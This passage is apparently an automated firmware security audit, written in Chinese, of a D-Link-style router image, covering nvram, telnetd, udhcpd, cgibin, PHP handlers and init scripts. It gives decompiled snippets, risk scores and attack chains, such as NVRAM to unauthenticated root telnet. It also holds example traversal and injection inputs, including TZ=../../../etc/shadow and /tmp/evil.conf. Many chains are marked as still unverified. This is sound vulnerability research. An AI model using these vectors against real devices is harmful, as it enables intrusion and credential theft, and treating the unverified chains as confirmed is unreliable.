- **类型:** network_input
- **综合优先级分数:** **8.35**
- **风险等级:** 8.5
- **置信度:** 9.0
- **触发可能性:** 7.0
- **查询相关性:** 10.0
- **阶段:** N/A
- **描述:** 高危内存破坏漏洞：函数fcn.0000a650(0xa674)未验证索引边界导致越界操作。触发条件：外部输入通过fcn.0000a40c传入索引值≥32 → 执行危险操作：1) 关闭任意文件描述符(sym.imp.close) 2) 释放任意内存(sym.imp.free) 3) 内存覆写(sym.imp.memset)。安全影响：服务拒绝或内存破坏可能导致权限提升。利用约束：需控制索引值且触发操作码分发机制。
- **代码片段:**
  ```
  *piVar2 = piVar2[-2] * 0x34 + 0x3dd10;
  sym.imp.close(*(*piVar2 + 8));
  ```
- **关键词:** fcn.0000a650, sym.imp.close, sym.imp.free, sym.imp.memset, fcn.0000a40c, 0x3dd10

---
### env_file_load-udev_config-arbitrary_file

- **文件路径:** `sbin/udevtrigger`
- **位置:** `udevtrigger: udev_config_init@0x9d00, trigger_uevent@0x9730`
- **类型:** configuration_load
- **综合优先级分数:** **8.35**
- **风险等级:** 8.5
- **置信度:** 9.0
- **触发可能性:** 7.0
- **查询相关性:** 9.5
- **阶段:** N/A
- **描述:** 环境变量'UDEV_CONFIG_FILE'存在任意文件加载漏洞。触发条件：攻击者可通过UART/网络服务等注入环境变量控制配置文件路径（如设置为/tmp/evil.conf）。该路径经简单处理后直接加载执行，无签名验证。当程序以高权限运行时，可篡改udev_root等关键参数。结合trigger_uevent函数中的路径拼接逻辑（使用udev_root与外部设备路径），可构造路径遍历序列（如udev_root='../../../'）访问系统敏感文件。实际安全影响：配合环境变量注入点可实现权限提升或系统文件泄露。
- **代码片段:**
  ```
  iVar2 = sym.imp.getenv(*0x9d24);
  dbg.strlcpy(*0x9d00,iVar2,0x200);
  dbg.parse_config_file(); // 加载恶意配置
  dbg.strlcat(path_buffer, *udev_root, 0x200); // 路径拼接
  sym.imp.open64(path_buffer,1);
  ```
- **关键词:** UDEV_CONFIG_FILE, getenv, udev_config_init, parse_config_file, file_map, udev_root, trigger_uevent, strlcpy, strlcat, open64, /etc/udev/udev.conf
- **备注:** 完整利用需两个条件：1) 环境变量注入能力（需评估其他组件） 2) 设备路径参数部分可控；关联知识库记录：hardware_input-udev_initialization-rule_trigger（S15udevd.sh）和udev环境变量验证需求（关键验证需求字段）

---
### env_get-timezone-TZ_fcn.60172710

- **文件路径:** `usr/bin/qemu-arm-static`
- **位置:** `fcn.60172710:0x601727a8`
- **类型:** env_get
- **综合优先级分数:** **8.2**
- **风险等级:** 8.0
- **置信度:** 9.0
- **触发可能性:** 7.5
- **查询相关性:** N/A
- **阶段:** N/A
- **描述:** TZ环境变量路径遍历漏洞：攻击者通过设置恶意TZ值（如TZ=../../../etc/shadow）触发未过滤的路径拼接逻辑。关键缺陷：路径检查函数（fcn.60172710）仅验证首字符是否为'/'，导致可绕过绝对路径限制。触发条件：1) 攻击者能注入环境变量（如通过Web接口或API）2) 程序加载时区信息时使用污染值。实际影响：读取任意文件（如/etc/shadow），形成初始攻击向量。
- **代码片段:**
  ```
  iVar10 = fcn.60131530(puVar36+0x48,"%s/%s",pcVar14,param_1);
  if (uVar9 != 0x2f) { ... }
  ```
- **关键词:** TZ, fcn.60131530, fcn.60172710, /usr/share/zoneinfo
- **备注:** 需追踪环境变量注入源头（如Web参数到setenv调用链），建议后续分析/etc/init.d脚本

---
### http-param-parser-rgbin-000136e4

- **文件路径:** `usr/sbin/httpc`
- **位置:** `rgbin:fcn.000136e4`
- **类型:** network_input
- **综合优先级分数:** **8.2**
- **风险等级:** 8.0
- **置信度:** 9.0
- **触发可能性:** 7.5
- **查询相关性:** 9.5
- **阶段:** N/A
- **描述:** HTTP参数解析缺陷：在fcn.000136e4函数中，GET/POST参数通过strchr解析后直接存储到内存指针*(param_2+4)，未进行长度验证或过滤。攻击者构造超长参数可触发内存破坏，若后续传播到缓冲区操作函数（如strcpy）将形成完整攻击链。触发条件：控制HTTP请求参数值，成功利用概率中高（7.5/10）。
- **代码片段:**
  ```
  pcVar1 = sym.imp.strchr(*(ppcVar5[-7] + 8),0x3f);
  ppcVar5[-2] = pcVar1;
  ```
- **关键词:** fcn.000136e4, param_2, strchr, strrchr, *(param_2+4), param_2_cross_component
- **备注:** 需验证参数是否传播到任务3的strcpy点，建议分析fcn.00012810/fcn.00013318函数。关联提示：param_2在bin/sqlite3组件中涉及SQL注入（见记录'sql_injection-sqlite3-raw_exec'），需确认跨组件数据流

---
### network_input-form_wireless-unvalidated_params

- **文件路径:** `htdocs/mydlink/form_wireless.php`
- **位置:** `form_wireless.php:113-130`
- **类型:** network_input
- **综合优先级分数:** **8.15**
- **风险等级:** 7.5
- **置信度:** 9.0
- **触发可能性:** 8.5
- **查询相关性:** 9.0
- **阶段:** N/A
- **描述:** 文件接收18个未经验证的HTTP POST参数（如f_ssid/f_radius_secret1），直接传递至系统配置层。攻击者通过伪造POST请求可注入恶意配置值（如含命令分隔符的SSID）。触发条件：向/form_wireless.php发送特制POST请求。约束条件：需后续组件（配置解析器/无线守护进程）存在漏洞才能形成完整攻击链。潜在影响：若配置项被用于系统命令执行或存在缓冲区溢出，可导致RCE或权限提升。
- **代码片段:**
  ```
  $ssid = $_POST["f_ssid"];
  $radius_secret1 = $_POST["f_radius_secret1"];
  set($wifi."/ssid", $ssid);
  set($wifi."/nwkey/eap/secret", $radius_secret1);
  ```
- **关键词:** f_ssid, f_radius_secret1, set, wifi/ssid, wifi/nwkey/eap/secret, $_POST
- **备注:** 关键攻击路径起始点。后续分析建议：1) 追踪'sbin'目录的无线守护进程 2) 分析set()函数实现的二进制组件 3) 检查配置解析逻辑

---
### command_execution-main-argv_overflow

- **文件路径:** `usr/sbin/nvram`
- **位置:** `usr/sbin/nvram:0x8828 fcn.00008754`
- **类型:** command_execution
- **综合优先级分数:** **8.1**
- **风险等级:** 8.0
- **置信度:** 9.0
- **触发可能性:** 7.0
- **查询相关性:** 9.5
- **阶段:** N/A
- **描述:** 命令行参数处理漏洞：主函数解析argv时使用strncpy(acStack_1002c, pcVar10, 0x10000)复制用户输入到固定栈缓冲区。当输入长度≥65536字节时，不添加终止符，导致后续strsep操作可能越界读取内存。触发条件：攻击者通过暴露的命令行接口(如web调用)传入超长参数。实际影响：1) 信息泄露(读取相邻内存) 2) 程序崩溃(拒绝服务)。边界检查：仅固定长度复制，无strlen/sizeof验证。
- **代码片段:**
  ```
  strncpy(iVar1,pcVar10,0x10000);
  sym.imp.nvram_set(uVar2,*(iVar14 + -4));
  ```
- **关键词:** main, argv, strncpy, acStack_1002c, strsep, 0x10000
- **备注:** 攻击路径：命令行参数→strncpy缓冲区→strsep越界。需验证：1) 实际CLI暴露方式 2) libnvram.so的二次校验机制

---
### file_read-etc_init.d_S20init.sh-xmldb_param_injection

- **文件路径:** `etc/init.d/S20init.sh`
- **位置:** `etc/init.d/S20init.sh:2,4`
- **类型:** file_read,command_execution
- **综合优先级分数:** **8.1**
- **风险等级:** 8.0
- **置信度:** 9.0
- **触发可能性:** 7.0
- **查询相关性:** 9.5
- **阶段:** N/A
- **描述:** S20init.sh通过'image_sign=`cat /etc/config/image_sign`'读取未经验证的文件内容，并直接作为参数传递给特权服务xmldb（'xmldb -d -n $image_sign'）。若攻击者能篡改/etc/config/image_sign文件（如通过权限配置错误或路径遍历漏洞），可污染xmldb启动参数。触发条件：1) /etc/config/image_sign文件被篡改 2) 系统重启或init.d脚本重执行。实际影响取决于xmldb对-n参数的处理：若存在参数注入漏洞，可能实现特权命令执行。
- **代码片段:**
  ```
  image_sign=\`cat /etc/config/image_sign\`
  xmldb -d -n $image_sign -t > /dev/console
  ```
- **关键词:** image_sign, /etc/config/image_sign, xmldb, -n
- **备注:** 需后续验证：1) /etc/config/image_sign文件权限（调用TaskDelegator分析文件属性）2) xmldb二进制对-n参数的安全处理（调用FunctionAnalysisDelegator分析/sbin/xmldb）

---
### attack_chain-nvram_to_unauth_telnet

- **文件路径:** `etc/init0.d/S80telnetd.sh`
- **位置:** `跨组件: NVRAM接口 → /sbin/devdata → /etc/init0.d/S80telnetd.sh`
- **类型:** ipc
- **综合优先级分数:** **8.1**
- **风险等级:** 9.0
- **置信度:** 7.0
- **触发可能性:** 7.5
- **查询相关性:** 10.0
- **阶段:** N/A
- **描述:** 跨组件攻击链：通过NVRAM写入漏洞设置ALWAYS_TN=1环境变量 → 触发S80telnetd.sh启动无认证telnetd服务。完整路径：1) 攻击者污染NVRAM中ALWAYS_TN值（如通过Web接口漏洞） 2) 系统重启或服务调用时，devdata读取ALWAYS_TN值 3) S80telnetd.sh执行时启动无认证telnetd。依赖条件：a) NVRAM写入接口存在漏洞 b) ALWAYS_TN存储于NVRAM（需验证）。实际影响：直接获得无认证root shell。
- **关键词:** NVRAM, ALWAYS_TN, devdata get -e ALWAYS_TN, telnetd, env_get
- **备注:** 关键验证缺口：1) 逆向/sbin/devdata确认ALWAYS_TN存储机制是否为NVRAM 2) 审计Web接口（如htdocs/mydlink）是否存在NVRAM写入功能 3) 检查CVE数据库（如CVE-2021-27137）确认类似漏洞

---
### configuration_load-init_script-S21usbmount_permission

- **文件路径:** `etc/init.d/S21usbmount.sh`
- **位置:** `etc/init.d/S21usbmount.sh`
- **类型:** configuration_load
- **综合优先级分数:** **8.05**
- **风险等级:** 8.0
- **置信度:** 9.5
- **触发可能性:** 6.0
- **查询相关性:** 8.5
- **阶段:** N/A
- **描述:** S21usbmount.sh存在高危权限配置漏洞：1) 文件权限设置为777（全局可读写执行）2) 作为init.d启动脚本在系统启动/USB设备挂载时以root权限自动执行 3) 攻击者获得文件写入权限后可植入恶意代码 4) 触发条件：系统重启或USB设备插入事件。实际安全影响：权限提升为root的任意命令执行，但需前置条件（获得文件写入权限）。
- **代码片段:**
  ```
  ls -l 输出: -rwxrwxrwx 1 root root 36
  ```
- **关键词:** S21usbmount.sh, rwxrwxrwx, /var/tmp/storage, init.d
- **备注:** 需验证：1) 实际生产环境权限设置 2) 攻击者获取文件写入权限的可行性（如通过其他漏洞）。关联知识库：/etc/init.d目录写权限验证需求（notes字段）。建议后续分析：1) 系统启动流程（inittab/rc.d）2) USB热插拔处理机制

---
### attack_chain-permission_escalation

- **文件路径:** `etc/init.d/S21usbmount.sh`
- **位置:** `跨组件: etc/init.d/S21usbmount.sh → etc/config/usbmount`
- **类型:** attack_chain
- **综合优先级分数:** **8.05**
- **风险等级:** 8.5
- **置信度:** 8.0
- **触发可能性:** 7.0
- **查询相关性:** 10.0
- **阶段:** N/A
- **描述:** 完整攻击链：通过S21usbmount.sh的777权限漏洞（知识库ID: configuration_load-init_script-S21usbmount_permission）植入恶意代码 → 恶意代码利用mkdir操作创建后门目录（当前存储的command_execution-init-mkdir_storage） → 系统重启/USB插入事件触发 → 以root权限执行植入代码。触发条件：攻击者获得文件写入权限（如通过Web漏洞）并触发初始化事件。关键约束：需验证/etc/init.d目录的实际写权限防护机制。
- **关键词:** S21usbmount.sh, /var/tmp/storage, rwxrwxrwx, init.d, command_execution
- **备注:** 关联发现：configuration_load-init_script-S21usbmount_permission（权限漏洞）, command_execution-init-mkdir_storage（执行点）。待验证：1) init.d目录写防护 2) USB事件处理隔离机制

---
### network_input-udhcpd-dhcp_hostname_injection

- **文件路径:** `usr/sbin/udhcpd`
- **位置:** `udhcpd:fcn.0000dda0(选项解析), fcn.0000d460:0xdbc4(execle)`
- **类型:** network_input
- **综合优先级分数:** **8.0**
- **风险等级:** 8.0
- **置信度:** 8.0
- **触发可能性:** 8.0
- **查询相关性:** 9.5
- **阶段:** N/A
- **描述:** **DHCP主机名注入漏洞链**：
- **触发条件**：设备作为DHCP客户端时接收恶意响应包（含特制option 12主机名字段）
- **传播路径**：recv接收报文→fcn.0000dda0解析选项（无长度校验）→主机名字段存储于结构体偏移0x6c→通过sprintf格式化输出→execle执行`/usr/share/udhcpc/default.script`脚本
- **安全影响**：主机名最大可控576字节，未过滤特殊字符（如`;`、`&`），可能：1) 通过sprintf造成格式化字符串漏洞 2) 污染脚本参数导致命令注入 3) 全局变量0xdd94若含格式说明符可扩大攻击面
- **利用概率**：高（8.0），需结合脚本漏洞但攻击面明确
- **关键词:** recv, fcn.0000dda0, option 12, 0x6c, sprintf, execle, /usr/share/udhcpc/default.script, 0xdd94
- **备注:** 后续需分析default.script的输入处理逻辑（linking_keywords: /usr/share/udhcpc/default.script）

---
### cmd_injection-gpiod_wanidx_param

- **文件路径:** `etc/init.d/S45gpiod.sh`
- **位置:** `S45gpiod.sh:2-5`
- **类型:** command_execution
- **综合优先级分数:** **7.95**
- **风险等级:** 8.0
- **置信度:** 8.5
- **触发可能性:** 7.0
- **查询相关性:** 9.0
- **阶段:** N/A
- **描述:** 脚本通过`xmldbc -g /device/router/wanindex`获取wanidx值，未经验证直接作为参数传递给gpiod守护进程（`gpiod -w $wanidx`）。攻击者若能污染/device/router/wanindex（如通过Web接口/NVRAM设置漏洞），可注入恶意参数实现命令注入。触发条件：1) 攻击者控制NVRAM值 2) 服务重启或系统reboot。实际影响取决于gpiod的参数处理逻辑，可能造成远程代码执行(RCE)或权限提升。
- **代码片段:**
  ```
  wanidx=\`xmldbc -g /device/router/wanindex\`
  if [ "$wanidx" != "" ]; then 
  	gpiod -w $wanidx &
  else
  	gpiod &
  fi
  ```
- **关键词:** wanidx, xmldbc, gpiod, /device/router/wanindex, -w
- **备注:** 关键验证点：1) 分析gpiod二进制验证参数处理逻辑 2) 追踪/device/router/wanindex的设置点（如Web后台或UCI配置）3) 检查其他服务是否依赖此NVRAM路径

---
### command_injection-nvram_get-popen

- **文件路径:** `mydlink/signalc`
- **位置:** `signalc:0xcea8 (fcn.0000cea8)`
- **类型:** configuration_load
- **综合优先级分数:** **7.95**
- **风险等级:** 8.0
- **置信度:** 8.5
- **触发可能性:** 7.0
- **查询相关性:** 9.5
- **阶段:** N/A
- **描述:** HTTP端口配置获取存在注入风险：通过popen执行'nvram get mdb_http_port'获取配置值，未进行数字范围(0-65535)或字符过滤。结合fcn.0000dc00格式化字符串漏洞，可形成RCE利用链。触发条件：1) 攻击者控制NVRAM中mdb_http_port值 2) 触发配置读取流程。安全影响：可能导致命令注入或内存破坏。
- **关键词:** popen, nvram get, mdb_http_port, fcn.0000a9b4, fcn.0000dc00, param_1+0x48b
- **备注:** 关联漏洞：1) VLAN配置注入（etc/services/LAYOUT.php）允许污染NVRAM值 2) 需配合格式化字符串漏洞（fcn.0000dc00）完成利用链

---
### stack_overflow-usr_sbin_nvram-strncpy

- **文件路径:** `usr/sbin/nvram`
- **位置:** `usr/sbin/nvram:0x8828 (fcn.00008754)`
- **类型:** command_execution
- **综合优先级分数:** **7.9**
- **风险等级:** 8.0
- **置信度:** 9.0
- **触发可能性:** 6.0
- **查询相关性:** 9.5
- **阶段:** N/A
- **描述:** strncpy边界缺陷导致内存越界风险：用户通过命令行执行`nvram set key=value`时，参数被strncpy复制到固定0x10000字节栈缓冲区(acStack_1002c)。当输入≥65536字节时不会添加NULL终止符，导致后续strsep操作越界访问内存。触发条件：攻击者通过web接口/telnet注入超长参数（需≥65536B）。实际影响：1) 拒绝服务（内存访问错误崩溃）2) 潜在信息泄露。利用概率受系统ARG_MAX限制（通常131072字节），在支持超长命令行的环境中可稳定触发。
- **代码片段:**
  ```
  iVar1 = iVar14 + -0x10000 + -4;
  *(iVar14 + -4) = iVar1;
  sym.imp.strncpy(iVar1, pcVar10, 0x10000);
  uVar2 = sym.imp.strsep(iVar14 + -4, iVar5 + *0x89b0);
  ```
- **关键词:** strncpy, acStack_1002c, 0x10000, strsep, fcn.00008754, pcVar10
- **备注:** 需结合libnvram验证实际崩溃效果；与现有记录'nvram_set-fcn00008754-unfiltered_input'存在关联：同一函数内未过滤输入问题

---
### command_injection-http_processor-content_type

- **文件路径:** `htdocs/cgibin`
- **位置:** `htdocs/cgibin:cgibin:0xea2c`
- **类型:** network_input
- **综合优先级分数:** **7.85**
- **风险等级:** 7.5
- **置信度:** 8.0
- **触发可能性:** 8.5
- **查询相关性:** 9.5
- **阶段:** N/A
- **描述:** HTTP命令注入风险：fcn.0000ea2c函数直接使用CONTENT_TYPE/CONTENT_LENGTH环境变量构造system()参数。触发条件：HTTP POST请求内容被污染时，通过环境变量传入命令。实际影响：若参数拼接未过滤，可导致远程命令执行。关键证据：该函数同时处理HTTP输入和执行system。
- **关键词:** CONTENT_TYPE, CONTENT_LENGTH, system, getenv, HTTP_POST
- **备注:** 需反编译验证参数构造过程。关联发现19处system调用

---
### file-inclusion-wand-setcfg

- **文件路径:** `htdocs/webinc/wand.php`
- **位置:** `wand.php:27-34`
- **类型:** network_input
- **综合优先级分数:** **7.85**
- **风险等级:** 8.0
- **置信度:** 7.5
- **触发可能性:** 8.0
- **查询相关性:** 9.0
- **阶段:** N/A
- **描述:** 动态文件包含漏洞：当$ACTION=SETCFG时，代码通过'$file = "/htdocs/phplib/setcfg/".$svc.".php"'包含文件，$svc来自未经验证的XML节点(query("service"))。攻击者可控制$svc值实现路径遍历或包含恶意文件，触发条件：1) 发送$ACTION=SETCFG的HTTP请求 2) 在XML中注入恶意service值 3) 绕过valid==1检查。实际影响取决于/phplib/setcfg目录权限，可能造成RCE。
- **代码片段:**
  ```
  $file = "/htdocs/phplib/setcfg/".$svc.".php";
  if (isfile($file)==1) dophp("load", $file);
  ```
- **关键词:** $svc, SETCFG, dophp, load, valid, query, service, setcfg, ACTIVATE, /htdocs/phplib/setcfg/
- **备注:** 需验证XML数据是否来自未过滤的HTTP输入。建议检查/phplib/setcfg目录文件列表

---
### attack_chain-http_to_nvram_config_injection

- **文件路径:** `htdocs/mydlink/form_wireless.php`
- **位置:** `跨文件关联：form_wireless.php:113-130 → usr/sbin/nvram:0x8844`
- **类型:** attack_chain
- **综合优先级分数:** **7.85**
- **风险等级:** 8.5
- **置信度:** 7.0
- **触发可能性:** 7.5
- **查询相关性:** 10.0
- **阶段:** N/A
- **描述:** 完整攻击链发现：HTTP网络输入（form_wireless.php）与NVRAM设置漏洞（usr/sbin/nvram）存在数据流关联。攻击路径：1) 攻击者通过POST请求注入恶意参数（如含命令分隔符的SSID） 2) 参数经set()函数写入系统配置 3) 配置可能通过nvram_set传递（需验证调用关系）4) nvram_set未过滤输入漏洞允许特殊字符注入。完整触发条件：向/form_wireless.php发送恶意请求→配置解析器调用nvram_set→触发NVRAM结构破坏或命令注入。约束条件：需验证set()与nvram_set的实际调用关系。潜在影响：RCE或权限提升（若libnvram.so使用危险函数处理配置）
- **关键词:** f_ssid, set, nvram_set, wifi/ssid, strchr, key=value
- **备注:** 后续验证需求：1) 逆向分析set()函数实现（可能在/sbin或/usr/sbin目录）2) 追踪配置项'wifi/ssid'在nvram_set中的处理路径 3) 检查libnvram.so是否存在命令执行点。关联记录：network_input-form_wireless-unvalidated_params + nvram_set-fcn00008754-unfiltered_input

---
### xml_output-$GETCFG_SVC-RUNTIME.CLIENTS.xml.php

- **文件路径:** `htdocs/webinc/getcfg/RUNTIME.CLIENTS.xml.php`
- **位置:** `RUNTIME.CLIENTS.xml.php:9`
- **类型:** network_input
- **综合优先级分数:** **7.85**
- **风险等级:** 7.5
- **置信度:** 8.0
- **触发可能性:** 8.5
- **查询相关性:** 9.0
- **阶段:** N/A
- **描述:** 变量$GETCFG_SVC被直接输出到XML的<service>标签。根据关联分析（PFWD.NAT-1.xml.php），$GETCFG_SVC已被确认为外部可控的HTTP输入，当攻击者构造恶意值时可能造成XSS/XML注入。完整攻击路径：1) 攻击者通过HTTP请求污染$GETCFG_SVC 2) 变量跨文件传递到当前脚本 3) 未经过滤输出到XML响应。触发条件：访问包含$GETCFG_SVC参数的特定端点。
- **代码片段:**
  ```
  <service><?=$GETCFG_SVC?></service>
  ```
- **关键词:** $GETCFG_SVC, <service>, XML输出, PFWD.NAT-1.xml.php
- **备注:** 跨文件污点传递链：HTTP输入(PFWD.NAT-1.xml.php)→$GETCFG_SVC→XML输出(当前文件)。未解决问题：1) 关键文件xnode.php缺失阻碍完整分析 2) 需验证XNODE_getpathbytarget()的安全实现

---
### configuration_load-tsa-bss_strcpy_overflow

- **文件路径:** `mydlink/tsa`
- **位置:** `tsa:0x14358`
- **类型:** configuration_load
- **综合优先级分数:** **7.85**
- **风险等级:** 8.5
- **置信度:** 8.0
- **触发可能性:** 6.0
- **查询相关性:** 9.0
- **阶段:** N/A
- **描述:** 全局缓冲区strcpy溢出风险：fcn.0001434c中strcpy(0x14358)将参数param_1直接复制到.bss段固定地址0x2be9c，无长度验证。若param_1源自外部输入且超目标缓冲容量，可能破坏堆内存。触发条件：攻击者控制输入源并构造超长数据。
- **关键词:** strcpy, bss_segment, 0x2be9c, global_buffer, param_1
- **备注:** 关键约束：未知0x2be9c缓冲区大小。关联知识库关键词：.bss, param_1

---
### attack_chain-writable_init_scripts

- **文件路径:** `etc/init.d/S21usbmount.sh`
- **位置:** `关联发现: etc/init.d/S21usbmount.sh + mydlink/mydlink-watch-dog.sh`
- **类型:** attack_chain
- **综合优先级分数:** **7.8**
- **风险等级:** 8.8
- **置信度:** 8.0
- **触发可能性:** 5.0
- **查询相关性:** 9.5
- **阶段:** N/A
- **描述:** 发现跨文件权限配置漏洞模式：多个init.d脚本（S21usbmount.sh/mydlink-watch-dog.sh）设置777权限。完整攻击链：1) 攻击者获得文件写入权限（需前置漏洞）2) 篡改脚本植入恶意代码 3) 触发系统事件（USB挂载/看门狗检测）4) root权限执行。关键约束：依赖文件写入能力作为前置条件。
- **关键词:** init.d, chmod 777, privilege_escalation, file_write
- **备注:** 当前缺失环节：文件写入类漏洞（如Web上传/NVRAM配置覆盖）。建议后续：1) 重点分析Web接口文件上传功能 2) 检查/etc目录写权限机制 3) 验证配置写入点访问控制

---
### buffer-overflow-telnetd-ptsname-strcpy

- **文件路径:** `usr/sbin/telnetd`
- **位置:** `fcn.00008e20:0x8e74`
- **类型:** network_input
- **综合优先级分数:** **7.75**
- **风险等级:** 8.0
- **置信度:** 8.5
- **触发可能性:** 6.0
- **查询相关性:** 9.5
- **阶段:** N/A
- **描述:** 伪终端路径缓冲区溢出漏洞：函数 fcn.00008e20 (0x8e74) 使用 strcpy 将内核返回的伪终端路径 (ptsname()) 复制到固定地址 0x12698 的全局缓冲区（约32字节），未进行长度验证。攻击者通过创建大量会话耗尽伪终端号，可导致内核返回超长路径（如 /dev/pts/999999），触发缓冲区溢出。触发条件：新telnet会话建立时系统伪终端资源耗尽。实际影响：可能实现远程代码执行（需结合堆栈布局），成功概率中等（需资源耗尽条件）。
- **代码片段:**
  ```
  uVar2 = sym.imp.ptsname(*piVar4);
  sym.imp.strcpy(piVar4[-2], uVar2);
  ```
- **关键词:** strcpy, ptsname, 0x12698, fcn.00008e20, .bss, telnetd
- **备注:** 需补充验证：1) 0x12698缓冲区明确定义和大小 2) 不同系统下伪终端路径最大长度 3) 溢出后控制流劫持可行性。后续建议使用 FunctionAnalysisDelegator 分析缓冲区相邻内存结构。

---
### auth-delegation-telnetd-external-exec

- **文件路径:** `usr/sbin/telnetd`
- **位置:** `fcn.00008f44:0x9214`
- **类型:** network_input
- **综合优先级分数:** **7.75**
- **风险等级:** 7.5
- **置信度:** 8.0
- **触发可能性:** 8.0
- **查询相关性:** 9.0
- **阶段:** N/A
- **描述:** 认证逻辑外部依赖风险：telnetd 通过 execv (0x9214) 调用外部认证程序（默认地址 0x1267c 指向 /bin/sh），自身不实现认证逻辑。若外部程序存在漏洞（如硬编码凭证或命令注入），攻击者可通过网络连接直接触发。触发条件：建立telnet连接时。实际影响：形成完整攻击链入口点（网络输入→认证绕过→系统访问），成功概率取决于外部程序安全性。
- **关键词:** execv, vfork, 0x9214, 0x1267c, /bin/sh, telnetd, authentication
- **备注:** 关键后续方向：分析 0x1267c 指向的外部程序（可能路径 /bin/login）。认证委托机制在 telnetd 主函数中通过 -l 参数配置，需检查启动脚本确认实际调用参数。

---
### http_input-XNODE_path_traversal-PFWD.NAT-1.xml.php

- **文件路径:** `htdocs/webinc/getcfg/PFWD.NAT-1.xml.php`
- **位置:** `PFWD.NAT-1.xml.php:4-24`
- **类型:** network_input
- **综合优先级分数:** **7.75**
- **风险等级:** 7.5
- **置信度:** 8.0
- **触发可能性:** 8.0
- **查询相关性:** 9.0
- **阶段:** N/A
- **描述:** 未经验证的外部输入$GETCFG_SVC通过HTTP请求传入后，被cut()函数分割并直接作为uid参数传递给XNODE_getpathbytarget()系统函数，用于查询/nat配置节点。触发条件：攻击者控制HTTP请求中的$GETCFG_SVC参数。约束检查缺失：未对分割后的字符串进行路径遍历字符过滤或权限校验。潜在影响：通过构造恶意uid值（如'../../'）可能实现未授权配置访问或信息泄露。实际利用需结合XNODE_getpathbytarget()实现，但当前文件证据表明存在输入验证缺陷。
- **代码片段:**
  ```
  $nat = XNODE_getpathbytarget("/nat", "entry", "uid", cut($GETCFG_SVC,1,"."));
  ```
- **关键词:** $GETCFG_SVC, cut, XNODE_getpathbytarget, /nat, entry, uid
- **备注:** 需验证XNODE_getpathbytarget()实现是否对输入进行安全处理。关联知识库关键词：XNODE_getpathbytarget。后续必须分析/htdocs/phplib/xnode.php文件确认污点传播路径

---
### hardware_input-udev_initialization-rule_trigger

- **文件路径:** `etc/init.d/S15udevd.sh`
- **位置:** `etc/init.d/S15udevd.sh`
- **类型:** hardware_input
- **综合优先级分数:** **7.66**
- **风险等级:** 7.2
- **置信度:** 9.0
- **触发可能性:** 6.8
- **查询相关性:** 8.5
- **阶段:** N/A
- **描述:** S15udevd.sh是硬编码初始化脚本，无参数/环境变量处理逻辑。主要风险在于其启动的udevd守护进程：1) 若udevd存在漏洞（如缓冲区溢出），可通过设备事件触发；2) 通过/etc/udev/rules.d规则，未过滤的设备属性（如恶意USB设备的ID_VENDOR_ID）可能触发危险RUN指令。触发条件：攻击者接入恶意设备或伪造uevent消息。
- **关键词:** udevd, udevstart, /etc/udev/rules.d, RUN{program}, ID_VENDOR_ID
- **备注:** 后续必须分析：1) /sbin/udevd二进制（检查网络监听/NVRAM操作）; 2) /etc/udev/rules.d/*.rules（检查RUN指令中的外部命令调用）; 3) 验证设备事件数据流是否跨越权限边界

---
### nvram_set-fcn00008754-unfiltered_input

- **文件路径:** `usr/sbin/nvram`
- **位置:** `fcn.00008754:0x8844`
- **类型:** nvram_set
- **综合优先级分数:** **7.6**
- **风险等级:** 7.5
- **置信度:** 8.5
- **触发可能性:** 6.5
- **查询相关性:** 9.0
- **阶段:** N/A
- **描述:** nvram_set未过滤输入：函数fcn.00008754直接调用nvram_set传递用户控制的键值对，未实施：1) 长度检查(未比较strlen和缓冲区大小) 2) 字符过滤(未使用isalnum等)。触发条件：攻击者通过-s key=value传入含特殊字符或超长数据。实际影响：1) 破坏NVRAM存储结构 2) 非法字符注入影响依赖组件(如httpd)。边界检查：完全缺失。
- **关键词:** fcn.00008754, nvram_set, -s, strchr, key=value
- **备注:** 攻击路径：-s参数→strchr分割→nvram_set未过滤写入。建议后续：1) 分析libnvram.so 2) 追踪NVRAM数据在httpd等组件中的使用

---
### configuration_load-tsa-format_string_risk

- **文件路径:** `mydlink/tsa`
- **位置:** `tsa:0x98cc`
- **类型:** configuration_load
- **综合优先级分数:** **7.6**
- **风险等级:** 8.0
- **置信度:** 7.0
- **触发可能性:** 7.5
- **查询相关性:** 9.5
- **阶段:** N/A
- **描述:** 命令处理函数格式化字符串风险：sprintf调用(0x98cc/0x99e8)使用全局指针(*0x9d34/*0x9d3c)作为格式字符串，目标缓冲区(*0x9d14)大小未知。若格式字符串含%s且外部输入(param_1)经strtok处理后超限，可能造成内存破坏。触发条件：1) 格式字符串含动态格式符 2) 攻击者控制输入超缓冲容量。边界检查缺失。
- **关键词:** sprintf, global_pointer, *0x9d14, format_string, param_1
- **备注:** 需验证：1) *0x9d34/*0x9d3c内容 2) *0x9d14缓冲区大小。关联知识库关键词：param_1, strtok

---
### env_get-NTFS3G_OPTIONS-injection

- **文件路径:** `sbin/ntfs-3g`
- **位置:** `函数地址0x106a0附近（反编译地址）`
- **类型:** env_get
- **综合优先级分数:** **7.6**
- **风险等级:** 8.0
- **置信度:** 8.0
- **触发可能性:** 6.0
- **查询相关性:** 9.0
- **阶段:** N/A
- **描述:** 环境变量NTFS3G_OPTIONS被程序通过getenv函数获取并解析为挂载选项，未进行任何验证或过滤。攻击者可通过控制该环境变量注入任意挂载选项（如'allow_other'、'windows_names'等），从而改变文件系统挂载行为。触发条件：1) 攻击者能够设置进程环境变量（如通过远程服务漏洞或本地shell）2) 程序以高权限执行（如root）。安全影响：可能绕过访问控制（如allow_other允许其他用户访问挂载点）或导致非预期行为（如windows_names限制文件名）。
- **关键词:** NTFS3G_OPTIONS, getenv, strsep, strcmp, allow_other, windows_names, no_def_opts, blkdev, streams_interface
- **备注:** 需结合固件中其他组件分析环境变量设置点。若存在远程设置环境变量的接口（如CGI脚本），则形成完整远程攻击链。

---
### HardwareOperation-PHYRegisterWrite-PrivilegeIssue

- **文件路径:** `etc/services/LAYOUT.php`
- **位置:** `/etc/init.d/网络服务脚本:未知 [powerdown_lan/PHYINF_setup] 0x0`
- **类型:** hardware_input
- **综合优先级分数:** **7.5**
- **风险等级:** 7.5
- **置信度:** 8.5
- **触发可能性:** 6.0
- **查询相关性:** 8.0
- **阶段:** N/A
- **描述:** 敏感硬件操作缺少权限隔离机制：
- powerdown_lan()函数直接通过`et robowr`操作物理网卡寄存器
- 通过insmod加载ctf.ko/et.ko内核模块
- 触发条件：脚本以root权限运行时自动执行
- 实际影响：若通过命令注入控制参数，可进行硬件级攻击(如网卡固件覆盖)
- 权限检查：无降权或能力限制
- **关键词:** powerdown_lan, et robowr, insmod, ctf.ko, PHYINF_setup
